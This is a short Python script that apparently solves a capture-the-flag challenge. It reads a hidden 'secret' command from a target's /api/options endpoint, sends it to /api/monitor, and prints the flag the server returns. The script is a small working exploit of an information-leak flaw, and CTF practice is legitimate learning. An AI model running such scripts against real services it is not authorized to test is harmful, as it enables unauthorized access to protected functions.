#!/usr/bin/env python3
import requests
import json
import sys

def Main(url):
    if len(sys.argv) != 2:
        print("Usage:", sys.argv[0], "[url]")
        return
    
    headers = {"Content-Type": "application/json"}

    print("[+] Grabbing secret...")
    r1 = requests.get(url + "/api/options")
    secret = r1.json()["allPossibleCommands"]["secret"][0]
    print("[+] Found secret:", secret)

    print("[+] Sending secret...")
    r2_json = {"command": secret}
    r2 = requests.post(url + "/api/monitor", json=r2_json, headers=headers)
    flag = r2.json()["message"]
    print("[+] Flag:", flag)

    return

if __name__ == "__main__":
    url = sys.argv[1]
    Main(url)